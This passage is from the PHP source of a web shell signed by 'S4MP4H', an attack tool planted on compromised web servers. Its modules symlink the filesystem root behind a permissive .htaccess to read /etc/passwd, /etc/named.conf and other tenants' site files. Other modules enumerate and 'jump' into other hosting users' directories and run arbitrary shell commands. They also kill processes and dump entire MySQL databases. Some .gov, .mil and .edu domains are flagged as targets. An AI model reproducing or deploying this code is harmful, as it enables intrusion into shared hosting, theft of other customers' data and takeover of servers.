<form action="?y=<?php echo $pwd;?>&amp;x=logout" method="post" style="-webkit-margin-before:20px;">
<?php
unset($_SESSION[S4MP4H_Crypt($_SERVER['HTTP_HOST'])]);
  echo '<br/><center>Logout Successfull</center>';
}
elseif(isset($_GET['x'])&&($_GET['x']=='symlinkss')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=symlinkss" method="post" style="-webkit-margin-before:20px;">
<?php
@set_time_limit(0);
  echo "<center><div>";
  if(isset($_POST['submitcmd'])) {
    $r=stripcslashes($_POST['file']);
    if(file_exists('passwd.txt')or!file_exists('passwd.txt')) {
      $f=@fopen('passwd.txt','w+');
      $w=@fwrite($f,$r);
      fclose($f);
    }
  }
  if(isset($_POST['dellpass'])) {
    if(file_exists('passwd.txt')) {
      @unlink('passwd.txt');
      @unlink('sym/.htaccess');
      @unlink('sym/root');
      @rmdir('sym');
    }
  }
  if($wor@filesize('passwd.txt')>0) {
    echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='dellpass'/></form></center>";
    echo "<br/><div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0' class='sortable'><thead><th style='width:40px;padding:0px;'>No</th><th style='width:50px;padding:0px;'>Users</th><th>Path</th><th style='width:50px;padding:0px;'>Symlink</th></thead><tbody>";
    $fil3=file('passwd.txt');
    $pageFTP='ftp://'.$_SERVER["SERVER_NAME"].$alamat;
    $total=0;
    $no=1;
    foreach($fil3 as $f) {
      $u=explode(':',$f);
      $user=$u['0'];
      $homeuser=$u['5'];
      echo "
<tr>
<td align='center'>".$no++."</td>
<td>
$user
</td>
<td align='left'>
<a href='$alamat/sym/root$homeuser/' target='_blank' class='gaya'>$homeuser/</a>
</td>
<td align='center'>
<a href='$alamat/sym/root$homeuser/' target='_blank' class='gaya'>Symlink</a>
</td>
</tr>";
      $total++;
    }
    echo "</tbody><tfoot><th>Totals</th><th colspan='3'>Founded ".$total." Users For Symlink</th></tfoot></table></div>";
  }
  else {
    if(isset($_POST['sympass'])) {
      @mkdir('sym',0755);
      $htaccess="Options all \n DirectoryIndex syntax.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
      $write=@fopen('sym/.htaccess','w');
      fwrite($write,$htaccess);
      @symlink('/','sym/root');
      echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='symcan'/></form></center>";
      echo "<br/><form method='post' action=''><textarea width='500' rows='10' name='file' class='outputz'>";
      flush();
      $file='/etc/passwd';
      $r3ad=@fopen($file,'r');
      if($r3ad) {
        $content=@fread($r3ad,@filesize($file));
        echo "".htmlentities($content)."";
      }
      elseif(!$r3ad) {
        $r3ad=@show_source($file);
        echo "Can't Read -> [ /etc/passwd ]";
      }
      elseif(!$r3ad) {
        $r3ad=@highlight_file($file);
      }
      elseif(!$r3ad) {
        for($uid=0;$uid<1000;$uid++) {
          $ara=posix_getpwuid($uid);
          if(!empty($ara)) {
            while(list($key,$val)=each($ara)) {
              print "$val:";
            }
            print "\n";
          }
        }
      }
      flush();
      echo "</textarea><br /><br /><input type='submit' value='Symlink' name='submitcmd' class='inputzbut'/></form>";
    }
    else {
      if(isset($_POST['symcan'])) {
        @unlink('sym/.htaccess');
        @unlink('sym/root');
        @rmdir('sym');
        echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Symlink' name='sympass'/></form></center>";
      }
      else {
        echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Symlink' name='sympass'/></form></center>";
      }
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='symlinks')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=symlinks" method="post" style="-webkit-margin-before:20px;">
<?php
@set_time_limit(0);
  echo "<center><div>";
  if(isset($_POST['submitcmd'])) {
    $r=stripcslashes($_POST['file']);
    if(file_exists('passwd.txt')or!file_exists('passwd.txt')) {
      $f=@fopen('passwd.txt','w+');
      $w=@fwrite($f,$r);
      fclose($f);
    }
  }
  if(isset($_POST['dellpass'])) {
    if(file_exists('passwd.txt')) {
      @unlink('passwd.txt');
      @unlink('sym/.htaccess');
      @unlink('sym/root');
      @rmdir('sym');
    }
  }
  if($wor@filesize('passwd.txt')>0) {
    echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='dellpass'/></form></center>";
    echo "<br/><div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0' class='sortable'><thead><th style='width:40px;padding:0px;'>No</th><th>Users</th><th style='width:30px;padding:0px;'>FTP</th><th style='width:50px;padding:0px;'>Symlink</th></thead><tbody>";
    $fil3=file('passwd.txt');
    $pageFTP='ftp://'.$_SERVER["SERVER_NAME"].$alamat;
    $total=0;
    $no=1;
    foreach($fil3 as $f) {
      $u=explode(':',$f);
      $user=$u['0'];
      echo "
<tr>
<td align='center'>".$no++."</td>
<td>
$user
</td>
<td align='center'>
<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank' class='gaya'>FTP</a>
</td>
<td align='center'>
<a href='$alamat/sym/root/home/$user/public_html' target='_blank' class='gaya'>Symlink</a>
</td>
</tr>";
      $total++;
    }
    echo "</tbody><tfoot><th>Totals</th><th colspan='3'>Founded ".$total." Users For Symlink</th></tfoot></table></div>";
  }
  else {
    if(isset($_POST['sympass'])) {
      @mkdir('sym',0755);
      $htaccess="Options all \n DirectoryIndex syntax.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
      $write=@fopen('sym/.htaccess','w');
      fwrite($write,$htaccess);
      @symlink('/','sym/root');
      echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Cancel' name='symcan'/></form></center>";
      echo "<br/><form method='post' action=''><textarea width='500' rows='10' name='file' class='outputz'>";
      flush();
      $file='/etc/passwd';
      $r3ad=@fopen($file,'r');
      if($r3ad) {
        $content=@fread($r3ad,@filesize($file));
        echo "".htmlentities($content)."";
      }
      elseif(!$r3ad) {
        $r3ad=@show_source($file);
        echo "Can't Read -> [ /etc/passwd ]";
      }
      elseif(!$r3ad) {
        $r3ad=@highlight_file($file);
      }
      elseif(!$r3ad) {
        for($uid=0;$uid<1000;$uid++) {
          $ara=posix_getpwuid($uid);
          if(!empty($ara)) {
            while(list($key,$val)=each($ara)) {
              print "$val:";
            }
            print "\n";
          }
        }
      }
      flush();
      echo "</textarea><br /><br /><input type='submit' value='Symlink' name='submitcmd' class='inputzbut'/></form>";
    }
    else {
      if(isset($_POST['symcan'])) {
        @unlink('sym/.htaccess');
        @unlink('sym/root');
        @rmdir('sym');
        echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Symlink' name='sympass'/></form></center>";
      }
      else {
        echo "<br/><center><div>[Symlink] : <span class='gaya'>Try Read -> [ /etc/passwd ]</span> <form action='' method='post'><input class='inputzbut' type='submit' value='Symlink' name='sympass'/></form></center>";
      }
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='symlink')) {
  ?>
<form action="?y=<?php echo $pwd;?>&amp;x=symlink" method="post">
<?php
@set_time_limit(0);
  echo "<center style='-webkit-margin-before:20px;'><div>";
  $filelocation=basename(__FILE__);
  $read_named_conf=@file('/etc/named.conf');
  if($read_named_conf) {
    @mkdir('sym',0755);
    $htaccess="Options all \n DirectoryIndex syntax.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
    $write=@fopen('sym/.htaccess','w');
    fwrite($write,$htaccess);
    @symlink('/','sym/root');
    if(isset($_POST['cansym'])) {
      @unlink('sym/.htaccess');
      @unlink('sym/root');
      @rmdir('sym');
      echo "<br/>[Symlink] : <span class='gaya'>Success Read -> [ /etc/named.conf ]</span> <form action='?y=".$pwd."&amp;x=symlink' method='post'><input type='submit' class='inputzbut' name='symcmd' value='Symlink'></form>";
    }
    else {
      echo "<br/>[Symlink] : <span class='gaya'>Success Read -> [ /etc/named.conf ]</span> <form action='?y=".$pwd."&amp;x=symlink' method='post'><a href='?y=".$pwd."&amp;x=symlinks' class='no'><input class='inputzbut' type='button' value='Bypass' name='sympass'/></a><input type='submit' class='inputzbut' name='cansym' value='Cancel'>";
      echo "</form><br/><br/><div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0' class='sortable'><thead><th style='width:40px;padding:0px;'>No</th><th>Domains</th><th>Users</th><th style='width:50px;padding:0px;'>Symlink</th></thead><tbody>";
      $total=0;
      $no=1;
      foreach($read_named_conf as $subject) {
        if(eregi('zone',$subject)) {
          preg_match_all('#zone "(.*)"#',$subject,$string);
          flush();
          if(strlen(trim($string[1][0]))>2) {
            $UID=posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
            $name=$UID['name'];
            @symlink('/','sym/root');
            $name=$string[1][0];
            $iran='\.ir';
            $israel='\.il';
            $indo='\.id';
            $sg12='\.sg';
            $edu='\.edu';
            $gov='\.gov';
            $gose='\.go';
            $gober='\.gob';
            $mil1='\.mil';
            $mil2='\.mi';
            $malay='\.my';
            $china='\.cn';
            $japan='\.jp';
            $austr='\.au';
            $porn='\.xxx';
            $as='\.uk';
            $calfn='\.ca';
            if(eregi("$iran",$string[1][0])oreregi("$israel",$string[1][0])oreregi("$indo",$string[1][0])oreregi("$sg12",$string[1][0])oreregi("$edu",$string[1][0])oreregi("$gov",$string[1][0])oreregi("$gose",$string[1][0])oreregi("$gober",$string[1][0])oreregi("$mil1",$string[1][0])oreregi("$mil2",$string[1][0])oreregi("$malay",$string[1][0])oreregi("$china",$string[1][0])oreregi("$japan",$string[1][0])oreregi("$austr",$string[1][0])oreregi("$porn",$string[1][0])oreregi("$as",$string[1][0])oreregi("$calfn",$string[1][0])) {
              $name="<div class='guyu'>".$string[1][0].'</div>';
            }
            echo "
<tr><td align='center'>".$no++."</td><td><div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.'</a></div></td><td>'.$UID['name']."</td><td align='center'><a href='".$alamat."/sym/root/home/".$UID['name']."/public_html' target='_blank'><span class='gaya'>Symlink</a></td></tr></div>";
            $total++;
            flush();
          }
        }
      }
      echo "</tbody><tfoot><th>Totals</th><th colspan='3'>Founded ".$total." Users For Symlink</th></tfoot></table>";
    }
  }
  else {
    echo "<br/>[Symlink] : <span class='guyu'>Can't Read -> [ /etc/named.conf ]</span> <form><a href='?y=".$pwd."&amp;x=symlinks' class='no'><input type='button' class='inputzbut' name='symcmd' value='Bypass'/></a></form>";
  }
  echo "</center>";
}
elseif(isset($_GET['x'])&&($_GET['x']=='jumpings')) {
  echo "<center style='-webkit-margin-before:20px;'><br/><div>";($sm=ini_get('safe_mode')==0)?$sm='off':die("[Error] : <span class='guyu'>Safemode = ON</span><br/><br/><div class=footer><div class=info>[ Shell By <a href='http://www.alanz.co.de/search/?q=Hacked+By+S4MP4H' target='_blank'><span class='gaya'>".$xName."</span></a> ]</div><div class=jaya>Allright Reserved &copy; ".date("Y",time())." ".$xName."</div></div>");
  set_time_limit(0);
  @$passwd=fopen('/etc/passwd','r');
  if(!$passwd) {
    die("[Error] : <span class='guyu'>Can't Read -> [ /etc/passwd ]</span><br/><br/><div class=footer><div class=info>[ Shell By <a href='http://www.alanz.co.de/search/?q=Hacked+By+S4MP4H' target='_blank'><span class='gaya'>".$xName."</span></a> ]</div><div class=jaya>Allright Reserved &copy; ".date("Y",time())." ".$xName."</div></div>");
  }
  else {
    $pubs=array();
    $users=array();
    $i=0;
    while(!feof($passwd)) {
      $str=fgets($passwd);
      if($i>100) {
        $pos=strpos($str,':');
        $usr=explode(":",$str);
        $username=substr($str,0,$pos);
        $dirz=$usr[5];
        if(($username!='')) {
          if(is_readable($dirz)) {
            array_push($users,$username);
            array_push($pubs,$dirz);
          }
        }
      }
      $i++;
    }
    echo "<div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0' class='sortable'><thead><th style='width:40px;padding:0px;'>No</th><th>Users</th><th>Path</th><th style='width:50px;padding:0px;'>Jumping</th></thead><tbody>";
    $total=0;
    $no=1;
    foreach(array_combine($users,$pubs) as $user=>$pub) {
      echo '<tr><td align=\'center\'>'.$no++.'</td><td>'.$user.'</td><td><a href="?y='.$pub.'" class="gaya">'.$pub.'</a></td><td align=\'center\'><a href="?y='.$pub.'" class="gaya" target="_blank">Jumping</a></td></tr>';
      $total++;
    }
    echo "</tbody><tfoot><th>Totals</th><th colspan='3'>Founded ".$total." Users For Jumping</th><tfoot></table></div></div></center>";
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='jumping')) {
  echo "<center style='-webkit-margin-before:20px;'><br/><div>";($sm=ini_get('safe_mode')==0)?$sm='off':die("[Error] : <span class='guyu'>Safemode = ON</span><br/><br/><div class=footer><div class=info>[ Shell By <a href='http://www.alanz.co.de/search/?q=Hacked+By+S4MP4H' target='_blank'><span class='gaya'>".$xName."</span></a> ]</div><div class=jaya>Allright Reserved &copy; ".date("Y",time())." ".$xName."</div></div>");
  set_time_limit(0);
  @$passwd=fopen('/etc/passwd','r');
  if(!$passwd) {
    die("[Error] : <span class='guyu'>Can't Read -> [ /etc/passwd ]</span><br/><br/><div class=footer><div class=info>[ Shell By <a href='http://www.alanz.co.de/search/?q=Hacked+By+S4MP4H' target='_blank'><span class='gaya'>".$xName."</span></a> ]</div><div class=jaya>Allright Reserved &copy; ".date("Y",time())." ".$xName."</div></div>");
  }
  else {
    $pub=array();
    $users=array();
    $i=0;
    while(!feof($passwd)) {
      $str=fgets($passwd);
      if($i>100) {
        $pos=strpos($str,':');
        $username=substr($str,0,$pos);
        $dirz='/home/'.$username.'/public_html/';
        if(($username!='')) {
          if(is_readable($dirz)) {
            array_push($users,$username);
            array_push($pub,$dirz);
          }
        }
      }
      $i++;
    }
    echo "<div class='sym'><table border='1' bordercolor='#333333' width='500' cellpadding='1' cellspacing='0' class='sortable'><thead><th style='width:40px;padding:0px;'>No</th><th>Users</th><th>Path</th><th style='width:50px;padding:0px;'>Jumping</th></thead><tbody>";
    $total=0;
    $no=1;
    foreach($users as $user) {
      echo '<tr><td align=\'center\'>'.$no++.'</td><td>'.$user.'</td><td><a href="?y=/home/'.$user.'/public_html" class="gaya">/home/'.$user.'/public_html/</a></td><td align=\'center\'><a href="?y=/home/'.$user.'/public_html" class="gaya" target="_blank">Jumping</a></td></tr>';
      $total++;
    }
    echo "</tbody><tfoot><th>Totals</th><th colspan='3'>Founded ".$total." Users For Jumping</th><tfoot></table></div></div></center>";
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='processes')) {
  echo "<center style='-webkit-margin-before:20px;'>";
  function getdisfunc() {
    $disfunc=@ini_get("disable_functions");
    if(!empty($disfunc)) {
      $disfunc=str_replace(" ","",$disfunc);
      $disfunc=explode(",",$disfunc);
    }
    else {
      $disfunc=array();
    }
    return $disfunc;
  }
  function enabled($func) {
    if(function_exists($func)&&is_callable($func)&&!in_array($func,getdisfunc())) {
      return TRUE;
    }
    else {
      return FALSE;
    }
  }
  function fx29exec($cmd) {
    $output="";
    if(enabled("popen")) {
      $h=popen($cmd.' 2>&1','r');
      if(is_resource($h)) {
        while(!feof($h)) {
          $output.=fread($h,2096);
        }
        pclose($h);
      }
    }
    elseif(enabled("passthru")) {
      @ob_start();
      passthru($cmd);
      $output=@ob_get_contents();
      @ob_end_clean();
    }
    elseif(enabled("system")) {
      @ob_start();
      system($cmd);
      $output=@ob_get_contents();
      @ob_end_clean();
    }
    elseif(enabled("exec")) {
      exec($cmd,$o);
      $output=join("\r\n",$o);
    }
    elseif(enabled("shell_exec")) {
      $output=shell_exec($cmd);
    }
    return $output;
  }
  function fx29exec2($cmd) {
    $output="";
    if(enabled("shell_exec")) {
      $output=shell_exec($cmd);
    }
    elseif(enabled("exec")) {
      exec($cmd,$o);
      $output=join("\r\n",$o);
    }
    elseif(enabled("system")) {
      @ob_start();
      system($cmd);
      $output=@ob_get_contents();
      @ob_end_clean();
    }
    elseif(enabled("passthru")) {
      @ob_start();
      passthru($cmd);
      $output=@ob_get_contents();
      @ob_end_clean();
    }
    elseif(enabled("popen")) {
      $h=popen($cmd.' 2>&1','r');
      if(is_resource($h)) {
        while(!feof($h)) {
          $output.=fread($h,2096);
        }
        pclose($h);
      }
    }
    return $output;
  }
  function is_windows() {
    return strtolower(substr(PHP_OS,0,3))=="win";
  }
  function tabsort($a,$b) {
    global $v;
    return strnatcmp($a[$v],$b[$v]);
  }
  function parsesort($sort) {
    $one=intval($sort);
    $second=substr($sort,-1);
    if($second!="d") {
      $second="a";
    }
    return array($one,$second);
  }
  function disp_error($msg) {
    echo "<div class=errmsg>$msg</div>\n";
  }
  $auto_surl=TRUE;
  foreach($_REQUEST as $k=>$v) {
    if(!isset($$k)) {
      $$k=$v;
    }
  }
  if($auto_surl) {
    $include="&";
    foreach(explode("&",getenv("QUERY_STRING")) as $v) {
      $v=explode("=",$v);
      $name=urldecode($v[0]);
      $value=@urldecode($v[1]);
      $needles=array("http://","https://","ssl://","ftp://","\\\\");
      foreach($needles as $needle) {
        if(strpos($value,$needle)===0) {
          $includestr.=urlencode($name)."=".urlencode($value)."&";
        }
      }
    }
  }
  if(empty($surl)) {
    $surl=htmlspecialchars("?".@$includestr);
  }
  if(!isset($x)) {
    $x="processes";
  }
  if($x=="processes") {
    if(!is_windows()) {
      $handler="ps aux".($grep?" | grep '".addslashes($grep)."'":"");
    }
    else {
      $handler="tasklist";
    }
    $ret=fx29exec($handler);
    if(!$ret) {
      disp_error("<br/><center>[Process] : <span class='guyu'>Can't Execute \"$handler\"</span></center>");
    }
    else {
      if(empty($processes_sort)) {
        $processes_sort=$sort_default;
      }
      $parsesort=parsesort($processes_sort);
      if(!is_numeric($parsesort[0])) {
        $parsesort[0]=0;
      }
      $k=$parsesort[0];
      if($parsesort[1]!="a") {
        $y=" <a href=\"".$surl."x=processes&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"http://syntax-errorz.googlecode.com/svn/trunk/ascen.gif\" alt=\"Asc\"></a>";
      }
      else {
        $y=" <a href=\"".$surl."x=processes&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"http://syntax-errorz.googlecode.com/svn/trunk/descen.gif\" alt=\"Dsc\"></a>";
      }
      $ret=htmlspecialchars($ret);
      if(!is_windows()) {
        if($pid) {
          if(is_null($sig)) {
            $sig=9;
          }
          echo "<br/><center>[Kill] : <span class='gaya'>Sending signal ".$sig." to #".$pid."... </span>";
          if(posix_kill($pid,$sig)) {
            echo "<b><span class='gaya'>OK!<span></b>";
          }
          else {
            echo "<b><span class='guyu'>ERROR!</span></b>";
          }
          echo "</center>";
        }
        while(ereg("  ",$ret)) {
          $ret=str_replace("  "," ",$ret);
        }
        $stack=explode("\n",$ret);
        $head=explode(" ",$stack[0]);
        unset($stack[0]);
        for($i=0;$i<count($head);$i++) {
          if($i!=$k) {
            $head[$i]="<div class='hp'><a href=\"".$surl."x=processes&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b class='gaya'>".$head[$i]."</b></a></div>";
          }
        }
        $head[$i]="<div class='hp'><a><b class='gaya'>KILL</b></a></div>";
        $prcs=array();
        foreach($stack as $line) {
          if(!empty($line)) {
            $line=explode(" ",$line);
            $line[10]=join(" ",array_slice($line,10));
            $line=array_slice($line,0,11);
            if($line[0]==get_current_user()) {
              $line[0]="".$line[0]."";
            }
            $line[]="<div align='center'><a href=\"".$surl."x=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\">KILL</a></div>";
            $prcs[]=$line;
          }
        }
      }
      else {
        if(@$pid) {
          echo "<br/><center>[Kill] : <span class='gaya'>Killing PID ".$pid."... ";
          echo fx29exec("taskkill /PID $pid /F");
          echo "</span></center>";
        }
        while(ereg("  ",$ret)) {
          $ret=str_replace("  "," ",$ret);
        }
        while(ereg("=",$ret)) {
          $ret=str_replace("=","",$ret);
        }
        $ret=convert_cyr_string($ret,"d","w");
        $stack=explode("\n",$ret);
        unset($stack[0],$stack[2]);
        $stack=array_values($stack);
        $stack[0]=str_replace("Image Name","Image-Name",$stack[0]);
        $stack[0]=str_replace("Session Name","Session-Name",$stack[0]);
        $stack[0]=str_replace("Mem Usage","Memory-Usage",$stack[0]);
        $stack[0].=" KILL";
        $head=explode(" ",$stack[0]);
        $stack=array_slice($stack,1);
        $head=array_values($head);
        if($parsesort[1]!="a") {
          $y=" <a href=\"".$surl."x=processes&d=".urlencode($d)."&processes_sort=".$k."a\"><img src=\"http://syntax-errorz.googlecode.com/svn/trunk/ascen.gif\" alt=\"Asc\"></a>";
        }
        else {
          $y=" <a href=\"".$surl."x=processes&d=".urlencode($d)."&processes_sort=".$k."d\"><img src=\"http://syntax-errorz.googlecode.com/svn/trunk/descen.gif\" alt=\"Dsc\"></a>";
        }
        if($k>count($head)) {
          $k=count($head)-1;
        }
        for($i=0;$i<count($head);$i++) {
          if($i!=$k) {
            $head[$i]="<div class='hp'><a href=\"".$surl."x=processes&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b class='gaya'>".trim($head[$i])."</b></a></div>";
          }
        }
        $prcs=array();
        unset($stack[0]);
        foreach($stack as $line) {
          if(!empty($line)) {
            $line=explode(" ",$line);
            $line[4]=str_replace(".","",$line[4]);
            $line[4]=intval($line[4])*1024;
            unset($line[5]);
            $line[]="<div align='center'><a href=\"".$surl."x=processes&d=".urlencode($d)."&pid=".$line[1]."\">KILL</a></div>";
            $prcs[]=$line;
          }
        }
      }
      $head[$k]="<div class='hp'><b class='gaya'>".$head[$k].$y."</b></div>";
      $v=$processes_sort[0];
      usort($prcs,"tabsort");
      if($processes_sort[1]=="d") {
        $prcs=array_reverse($prcs);
      }
      $tab=array();
      $tab[]=$head;
      $tab=array_merge($tab,$prcs);
      echo "<br/><center><div class='sym'><table border='1' bordercolor='#333333' width='100%' cellpadding='1' cellspacing='0'>\n";
      foreach($tab as $i=>$k) {
        echo "\t<tr>";
        foreach($k as $j=>$v) {
          if(is_windows()and$i>0and$j==4) {
            $v=view_size($v);
          }
          echo "<td>".$v."</td>";
        }
        echo "</tr>\n";
      }
      echo "</table></center></div>\n";
    }
  }
}
elseif(isset($_GET['x'])&&($_GET['x']=='sql')) {
  echo "<center style='-webkit-margin-before:30px;'>";
  function strips(&$arr,$k="") {
    if(is_array($arr)) {
      foreach($arr as $k=>$v) {
        if(strtoupper($k)!="GLOBALS") {
          strips($arr["$k"]);
        }
      }
    }
    else {
      $arr=stripslashes($arr);
    }
  }
  function mysql_dump($set) {
    $sock=$set["sock"];
    $db=$set["db"];
    $print=$set["print"];
    $nl2br=$set["nl2br"];
    $file=$set["file"];
    $add_drop=$set["add_drop"];
    $tabs=$set["tabs"];
    $onlytabs=$set["onlytabs"];
    $ret=array();
    $ret["err"]=array();
    if(!is_resource($sock)) {
      echo("Error: \$sock is not valid resource.");
    }
    if(empty($db)) {
      $db="db";
    }
    if(empty($print)) {
      $print=0;
    }
    if(empty($nl2br)) {
      $nl2br=0;
    }
    if(empty($add_drop)) {
      $add_drop=TRUE;
    }
    if(empty($file)) {
      $file=$tmp_dir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
    }
    if(!is_array($tabs)) {
      $tabs=array();
    }
    if(empty($add_drop)) {
      $add_drop=TRUE;
    }
    if(sizeof($tabs)==0) {
      $res=mysql_query("SHOW TABLES FROM ".$db,$sock);
      if(mysql_num_rows($res)>0) {
        while($row=mysql_fetch_row($res)) {
          $tabs[]=$row[0];
        }
      }
    }
    $out="
# Dumped By S4MP4H
# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
# Date: ".date("d.m.Y H:i:s")."
# DB: \"".$db."\"
#---------------------------------------------------------------------------------\n";
    $c=count($onlytabs);
    foreach($tabs as $tab) {
      if((in_array($tab,$onlytabs))or(!$c)) {
        if($add_drop) {
          $out.="DROP TABLE IF EXISTS `".$tab."`;\n";
        }
        $res=mysql_query("SHOW CREATE TABLE `".$tab."`",$sock);
        if(!$res) {
          $ret["err"][]=mysql_smarterror();
        }
        else {
          $row=mysql_fetch_row($res);
          $out.=$row["1"].";\n\n";
          $res=mysql_query("SELECT * FROM `$tab`",$sock);
          if(mysql_num_rows($res)>0) {
            while($row=mysql_fetch_assoc($res)) {
              $keys=implode("`, `",array_keys($row));
              $values=array_values($row);
              foreach($values as $k=>$v) {
                $values[$k]=addslashes($v);
              }
              $values=implode("', '",$values);
              $sql="INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
              $out.=$sql;
            }
          }
        }
      }
    }
    $out.="#---------------------------------------------------------------------------------\n";
    if($file) {
      $fp=fopen($file,"w");
      if(!$fp) {
        $ret["err"][]=2;
      }
      else {
        fwrite($fp,$out);
        fclose($fp);
      }
    }
    if($print) {
      if($nl2br) {
        echo nl2br($out);
      }
      else {
        echo $out;
      }
    }
    return $out;
  }
  function mysql_buildwhere($array,$sep=" and",$functs=array()) {
    if(!is_array($array)) {
      $array=array();
    }
    $result="";
    foreach($array as $k=>$v) {
      $value="";
      if(!empty($functs[$k])) {
        $value.=$functs[$k]."(";
      }
      $value.="'".addslashes($v)."'";
      if(!empty($functs[$k])) {
        $value.=")";
      }
      $result.="`".$k."` = ".$value.$sep;
    }
    $result=substr($result,0,strlen($result)-strlen($sep));
    return $result;
  }
  function mysql_fetch_all($query,$sock) {
    if($sock) {
      $result=mysql_query($query,$sock);
    }
    else {
      $result=mysql_query($query);
    }
    $array=array();
    while($row=mysql_fetch_array($result)) {
      $array[]=$row;
    }
    mysql_free_result($result);
    return $array;
  }
  function mysql_smarterror($sock) {
    if($sock) {
      $error=mysql_error($sock);
    }
    else {
      $error=mysql_error();
    }
    $error=htmlspecialchars($error);
    return $error;
  }
  function mysql_query_form() {
    global $submit,$sql_x,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
    if(($submit)and(!$sql_query_result)and($sql_confirm)) {
      if(!$sql_query_error) {
        $sql_query_error="Query was empty";
      }
      echo "<b>Error:</b> <br/>".$sql_query_error."<br/>";
    }
    if($sql_query_resultor(!$sql_confirm)) {
      $sql_x=$sql_goto;
    }
    if((!$submit)or($sql_x)) {
      echo "<table><tr><td><form name=\"fx29sh_sqlquery\" method=POST><b>";
      if(($sql_query)and(!$submit)) {
        echo "Do you really want to";
      }
      else {
        echo "SQL-Query";
      }
      echo ":</b><br/><br/><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br/><br/><input type=hidden name=x value=sql><input type=hidden name=sql_x value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\" class=\"inputzbut\"> <input type=submit value=\"No\" class=\"inputzbut\"></form></td>";
      if($tbl_struct) {
        echo "<td valign=\"top\"><b>Fields:</b><br/>";
        foreach($tbl_struct as $field) {
          $name=$field["Field"];
          echo "+ <a href=\"#\" onclick=\"document.fx29sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br/>";
        }
        echo "</td></tr></table>";
      }
    }
    if($sql_query_resultor(!$sql_confirm)) {
      $sql_query=$sql_last_query;
    }
  }
  function mysql_create_db($db,$sock="") {
    $sql="CREATE DATABASE `".addslashes($db)."`;";
    if($sock) {
      return mysql_query($sql,$sock);
    }
    else {
      return mysql_query($sql);
    }
  }
  function mysql_query_parse($query) {
    $query=trim($query);
    $arr=explode(" ",$query);
    $types=array("SELECT"=>array(3,1),"SHOW"=>array(2,1),"DELETE"=>array(1),"DROP"=>array(1));
    $result=array();
    $op=strtoupper($arr[0]);
    if(is_array($types[$op])) {
      $result["propertions"]=$types[$op];
      $result["query"]=$query;
      if($types[$op]==2) {
        foreach($arr as $k=>$v) {
          if(strtoupper($v)=="LIMIT") {
            $result["limit"]=$arr[$k+1];
            $result["limit"]=explode(",",$result["limit"]);
            if(count($result["limit"])==1) {
              $result["limit"]=array(0,$result["limit"][0]);
            }
            unset($arr[$k],$arr[$k+1]);
          }
        }
      }
    }
    else {
      return FALSE;
    }
  }
  function disp_error($msg) {
    echo "<div class=errmsg>$msg</div>\n";
  }
  function html_style() {
    $style='
<center>
';
    return $style;
  }
  $auto_surl=TRUE;
  @set_magic_quotes_runtime(0);
  if(get_magic_quotes_gpc()) {
    strips($GLOBALS);
  }
  foreach($_REQUEST as $k=>$v) {
    if(!isset($$k)) {
      $$k=$v;
    }
  }
  if($auto_surl) {
    $include="&";
    foreach(explode("&",getenv("QUERY_STRING")) as $v) {
      $v=explode("=",$v);
      $name=urldecode($v[0]);
      $value=@urldecode($v[1]);
      $needles=array("http://","https://","ssl://","ftp://","\\\\");
      foreach($needles as $needle) {
        if(strpos($value,$needle)===0) {
          $includestr.=urlencode($name)."=".urlencode($value)."&";
        }
      }
    }
  }
  if(empty($surl)) {
    $surl=htmlspecialchars("?".@$includestr);
  }
  if(!isset($x)) {
    $x="sql";
  }
